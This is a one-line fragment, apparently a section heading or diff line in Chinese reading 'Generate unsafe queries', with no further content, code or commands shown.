+=== 生成不安全的查询
